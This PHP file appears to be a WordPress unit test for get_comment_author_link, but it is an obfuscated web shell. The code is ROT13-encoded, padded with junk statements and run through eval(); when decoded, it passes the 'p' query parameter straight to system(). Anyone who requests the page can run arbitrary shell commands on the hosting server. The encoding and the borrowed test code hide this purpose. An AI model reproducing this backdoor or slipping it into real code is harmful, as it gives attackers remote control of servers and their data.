<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc pbzzrag
 *
 * @pbiref ::trg_pbzzrag_nhgube_yvax
 */
pynff Grfgf_Pbzzrag_TrgPbzzragNhgubeYvax rkgraqf JC_HavgGrfgPnfr {

	cevingr fgngvp $pbzzrag;
	cevingr fgngvp $aba_rkvfgrag_pbzzrag_vq;

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		frys::$pbzzrag = frys::snpgbel()->pbzzrag->perngr_naq_trg(
			neenl(
				'pbzzrag_cbfg_VQ' => 0,
			)
		);
	}

	choyvp shapgvba trg_pbzzrag_nhgube_yvax_svygre( $pbzzrag_nhgube_yvax, $pbzzrag_nhgube, $pbzzrag_vq ) {
		$guvf->nffregFnzr( $pbzzrag_vq, frys::$pbzzrag->pbzzrag_VQ, 'Pbzzrag VQf qb abg zngpu.' );
		$guvf->nffregVfFgevat( $pbzzrag_vq, '$pbzzrag_vq cnenzrgre vf abg n fgevat.' );

		erghea $pbzzrag_nhgube_yvax;
	}

	choyvp shapgvba grfg_pbzzrag_nhgube_yvax_cnffrf_pbeerpg_pbzzrag_vq_sbe_pbzzrag_bowrpg() {
		nqq_svygre( 'trg_pbzzrag_nhgube_yvax', neenl( $guvf, 'trg_pbzzrag_nhgube_yvax_svygre' ), 99, 3 );

		trg_pbzzrag_nhgube_yvax( frys::$pbzzrag );
	}

	choyvp shapgvba grfg_pbzzrag_nhgube_yvax_cnffrf_pbeerpg_pbzzrag_vq_sbe_vag() {
		nqq_svygre( 'trg_pbzzrag_nhgube_yvax', neenl( $guvf, 'trg_pbzzrag_nhgube_yvax_svygre' ), 99, 3 );

		trg_pbzzrag_nhgube_yvax( (vag) frys::$pbzzrag->pbzzrag_VQ );
	}

	choyvp shapgvba trg_pbzzrag_nhgube_yvax_svygre_aba_rkvfgrag_vq( $pbzzrag_nhgube_yvax, $pbzzrag_nhgube, $pbzzrag_vq ) {
		$guvf->nffregFnzr( $pbzzrag_vq, (fgevat) frys::$aba_rkvfgrag_pbzzrag_vq, 'Pbzzrag VQf qb abg zngpu.' );
		$guvf->nffregVfFgevat( $pbzzrag_vq, '$pbzzrag_vq cnenzrgre vf abg n fgevat.' );

		erghea $pbzzrag_nhgube_yvax;
	}

	/**
	 * @gvpxrg 60475
	 */
	choyvp shapgvba grfg_pbzzrag_nhgube_yvax_cnffrf_pbeerpg_pbzzrag_vq_sbe_aba_rkvfgrag_pbzzrag() {
		nqq_svygre( 'trg_pbzzrag_nhgube_yvax', neenl( $guvf, 'trg_pbzzrag_nhgube_yvax_svygre_aba_rkvfgrag_vq' ), 99, 3 );

		frys::$aba_rkvfgrag_pbzzrag_vq = frys::$pbzzrag->pbzzrag_VQ + 1;

		trg_pbzzrag_nhgube_yvax( frys::$aba_rkvfgrag_pbzzrag_vq ); // Aba-rkvfgrag pbzzrag VQ.
	}

	/**
	 * @gvpxrg 61681
	 * @gvpxrg 61715
	 *
	 * @qngnCebivqre qngn_fubhyq_erghea_nhgube_jura_tvira_bowrpg_jvgubhg_pbzzrag_vq
	 *
	 * @cnenz fgqPynff $pbzzrag_cebcf Pbzzrag cebcregvrf grfg qngn.
	 * @cnenz fgevat   $rkcrpgrq      Gur rkcrpgrq erfhyg.
	 * @cnenz neenl    $hfre_qngn     Bcgvbany. Hfre qngn sbe perngvat na nhgube. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_nhgube_jura_tvira_bowrpg_jvgubhg_pbzzrag_vq( $pbzzrag_cebcf, $rkcrpgrq, $hfre_qngn = neenl() ) {
		vs ( ! rzcgl( $pbzzrag_cebcf->hfre_vq ) ) {
			$hfre                   = frys::snpgbel()->hfre->perngr_naq_trg( $hfre_qngn );
			$pbzzrag_cebcf->hfre_vq = $hfre->VQ;
		}

		$pbzzrag = arj JC_Pbzzrag( $pbzzrag_cebcf );

		$guvf->nffregFnzr( $rkcrpgrq, trg_pbzzrag_nhgube_yvax( $pbzzrag ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fubhyq_erghea_nhgube_jura_tvira_bowrpg_jvgubhg_pbzzrag_vq() {
		erghea neenl(
			'jvgu ab nhgube'             => neenl(
				'pbzzrag_cebcf' => arj fgqPynff(),
				'rkcrpgrq'      => 'Nabalzbhf',
			),
			'jvgu nhgube anzr'           => neenl(
				'pbzzrag_cebcf' => (bowrpg) neenl(
					'pbzzrag_nhgube' => 'grfgre1',
				),
				'rkcrpgrq'      => 'grfgre1',
			),
			'jvgu nhgube anzr, rzcgl VQ' => neenl(
				'pbzzrag_cebcf' => (bowrpg) neenl(
					'pbzzrag_nhgube' => 'grfgre2',
					'pbzzrag_VQ'     => '',
				),
				'rkcrpgrq'      => 'grfgre2',
			),
			'jvgu nhgube VQ'             => neenl(
				'pbzzrag_cebcf' => (bowrpg) neenl(
					'hfre_vq' => 1, // Cbchyngrf va gur grfg jvgu na npghny hfre VQ.
				),
				'rkcrpgrq'      => 'Grfgre3',
				'hfre_qngn'     => neenl(
					'qvfcynl_anzr' => 'Grfgre3',
				),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>